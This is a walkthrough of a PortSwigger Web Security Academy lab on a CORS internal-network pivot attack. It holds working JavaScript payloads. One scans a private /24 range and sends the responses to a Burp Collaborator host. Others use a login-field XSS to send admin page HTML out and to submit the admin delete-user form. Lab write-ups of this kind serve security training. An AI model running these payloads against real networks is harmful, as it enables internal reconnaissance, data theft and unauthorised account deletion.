Most CORS attacks rely on the presence of the response header:
```js
Access-Control-Allow-Credentials: true
```
Without that header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content, which they could just as easily access by browsing directly to the target website.

f a website is on a company's private network (intranet) with a special, non-public internet address(Private ip address), it's harder for outside attackers to reach it directly. But because these internal sites might have weaker security, attackers can sometimes exploit weaknesses to get in and cause problems.

**For example, a cross-origin request within a private network may be as follows:**
```js
GET /reader?url=doc1.pdf 
Host: intranet.normal-website.com
Origin: https://normal-website.com
```

**And the server responds with:**
```js
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: *
```
- The application server is trusting resource requests from any origin without credentials.
- When people in a private network connect to the internet, attackers can use their web browsers to access the private network's resources through a technique called CORS-based attack, without their knowledge.

## Steps to solve lab
### Title - CORS vulnerability with internal network pivot attack

**Desc** - This website has an insecure [CORS](https://portswigger.net/web-security/cors) configuration in that it trusts all internal network origins. This lab requires multiple steps to complete. To solve the lab, craft some JavaScript to locate an endpoint on the local network (`192.168.0.0/24`, port `8080`) that you can then use to identify and create a CORS-based attack to delete a user. The lab is solved when you delete user `carlos`.

##### Steps to complete the exercise:
1. Scan the local network (192.168.0.0/24) for endpoints that have port 8080 open.
2. Create a CORS-based attack to delete the Carlos user.

1. From the lab description, we already know that there is insecure cors configuration on the website and for that first we are going to scan the local network(192.168.0.0/24, port 8080).

**Script to scan the local network** - 
```js
<!-- Scanning which IP(in range 192.168.0.0 ) is running web service on port 8080 -->

<html>
	<script>
		collaboratorURL = 'http://w638wusq9v08mm9rfq3w1lhm4da4yumj.oastify.com'; // Storing collaborator url in variable
		// Iterating through range of IP's
		for(let i=0; i<256; i++){
			fetch('http://192.168.0.'+i+':8080') //send the request
			.then(response => response.text()) // Fetch the response
			// If the response contains text then do the below stuff
			.then(text => {
				try{
					fetch(collaboratorURL + '?ip=' + 'http://192.168.0.'+i+"&code=" + encodeURIComponent(text))
				}catch(err){
					
				}
			})
		}
	</script>
</html>
```

**Deliver the exploit to victim with the help of exploit server** - 
![[cors32.png]]

**Here we got a response in our collaborator server** - 
![[cors33.png]]
As you can see above, there we got a response from vulnerable endpoint.

**After decoding the URL encoded response with the help of burp Decoder, we got some information about what the vulnerable website is** - 
```js
<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>CORS vulnerability with internal network pivot attack</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>CORS vulnerability with internal network pivot attack</h2>
                            <a id='exploit-link' class='button' target='_blank' href='http://exploit-0ae000a103ac59c0843626cb010a0009.exploit-server.net'>Go to exploit server</a>
                            <a class=link-back href='https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <form class=login-form method=POST action="/login">
                            <input required type="hidden" name="csrf" value="SKenbRSlDLlixbSfmpJGLr5D9MGba1ss">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```
After analyzing the above code, we got to know that it either the user not logged to this site that's why we don't authenticated page or web server is configured to allow all origins, however it's not configured to pass credentials in a CORS request.

2. Try to find an XSS vulnerability in the login page in order to bypass all the CORS restriction. If we find a XSS vulnerability then we can make the request as if it is coming from the vulnerable website origin and from that we can access the unauthenticated pages.

**Script to check that there is any XSS vulnerability in the login page** - 
```js
<html>
    <script>
    collaboratorURL = 'http://w638wusq9v08mm9rfq3w1lhm4da4yumj.oastify.com';
    url = 'http://192.168.0.159:8080'

    fetch(url)
    .then(response => response.text())
    .then(text => {
        try{
            // The below XSS vector can be different depending on the version of web server
            xss_vector = '"><img src='+collaboratorURL+'?foundXSS=1>';

            // We already found out that there is a vulnerability in the username field of login page. Here, for CSRF token we match the CSRF token agains response and grab the value of the CSRF token.
            login_path = '/login?username='+encodeURIComponent(xss_vector)+'&password=random&csrf='+text.match(/csrf" value="([^"]+)"/);

            // Below, we change the current of victim
            location = url + login_path;
        }catch(err){
        
        }
    })
    </script>
</html>
```

**Note** - You can form the regex for extracting CSRF token with the help of https://regex101.com/
![[cors34.png]]

**Here, we got a response that means "username" field of login page is vulnerable to XSS** - 
![[cors35.png]]

3. Now, we are going to use the XSS vulnerability in order to access an authenticated page(Admin page).

**Script to Access the authenticated admin page** - 
```js
<html>
    <script>
    collaboratorURL = 'http://w638wusq9v08mm9rfq3w1lhm4da4yumj.oastify.com';
    url = 'http://192.168.0.159:8080'

    fetch(url)
    .then(response => response.text())
    .then(text => {
        try{
            // The below XSS vector can be different depending on the version of web server
            xss_vector = '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">';

            // We already found out that there is a vulnerability in the username field of login page. Here, for CSRF token we match the CSRF token agains response and grab the value of the CSRF token.
            login_path = '/login?username='+encodeURIComponent(xss_vector)+'&password=random&csrf='+text.match(/csrf" value="([^"]+)"/);

            // Below, we change the current of victim
            location = url + login_path;
        }catch(err){
        
        }
    })
    </script>
</html>
```

**After sending this to victim, we got a response containing the admin page code.** - 
![[cors36.png]]

**After decoding it with the help of Burp Decoder we got information about admin page.** - 
```js

<script src="/resources/labheader/js/labHeader.js"></script>
<div id="academyLabHeader">
	<section class="academyLabBanner">
		<div class="container">
			<div class="logo"></div>
				<div class="title-container">
					<h2>CORS vulnerability with internal network pivot attack</h2>
					<a id="exploit-link" class="button" target="_blank" href="http://exploit-0ae10029044b4d0b809c6176018900c1.exploit-server.net">Go to exploit server</a>
					<a class="link-back" href="https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack">
						Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
						<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 28 30" enable-background="new 0 0 28 30" xml:space="preserve" title="back-arrow">
							<g>
								<polygon points="1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15"></polygon>
								<polygon points="14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15"></polygon>
							</g>
						</svg>
					</a>
				</div>
				<div class="widgetcontainer-lab-status is-notsolved">
					<span>LAB</span>
					<p>Not solved</p>
					<span class="lab-status-icon"></span>
				</div>
			</div>
		</section></div>
	

<div theme="">
	<section class="maincontainer">
		<div class="container is-page">
			<header class="navigation-header">
				<section class="top-links">
					<a href="/">Home</a><p>|</p>
					<a href="/admin">Admin panel</a><p>|</p>
					<a href="/my-account?id=administrator">My account</a><p>|</p>
				</section>
			</header>
			<header class="notification-header">
			</header>
			<form style="margin-top: 1em" class="login-form" action="/admin/delete" method="POST">
				<input required="" type="hidden" name="csrf" value="SZSSYeSk75xIOzskjR4N0celzydxaYEt">
				<label>Username</label>
				<input required="" type="text" name="username">
				<button class="button" type="submit">Delete user</button>
			</form>
		</div>
	</section>
	<div class="footer-wrapper">
	</div>
</div>
```

4. We are going to use the XSS vulnerability to delete the Carlos user.

**Script to delete the user Carlos** - 
```js
<html>
    <script>
    collaboratorURL = 'http://w638wusq9v08mm9rfq3w1lhm4da4yumj.oastify.com';
    url = 'http://192.168.0.159:8080'

    fetch(url)
    .then(response => response.text())
    .then(text => {
        try{
            // The below XSS vector can be different depending on the version of web server
            xss_vector = '"><iframe src=/admin onload="
            var f = this.contentWindow.document.forms[0]; 
            if(f.username){
                f.username.value = \'carlos\';
            }
                f.submit();
            ">';

            // We already found out that there is a vulnerability in the username field of login page. Here, for CSRF token we match the CSRF token agains response and grab the value of the CSRF token.
            login_path = '/login?username='+encodeURIComponent(xss_vector)+'&password=random&csrf='+text.match(/csrf" value="([^"]+)"/);

            // Below, we change the current of victim
            location = url + login_path;
        }catch(err){
        
        }
    })
    </script>
</html>
```

**paste the below code** - 
```js
<html>
    <script>
    url = 'http://192.168.0.159:8080'

    fetch(url)
    .then(response => response.text())
    .then(text => {
        try{
          xss_vector = '"><iframe src=/admin onload="var f = this.contentWindow.document.forms[0]; if(f.username) f.username.value=\'carlos\',f.submit()">';
            login_path = '/login?username='+encodeURIComponent(xss_vector)+'&password=random&csrf='+text.match(/csrf" value="([^"]+)"/);

            // Below, we change the current of victim
            location = url + login_path;
        }catch(err){
        
        }
    })
    </script>
</html>
```

![[cors37.png]]

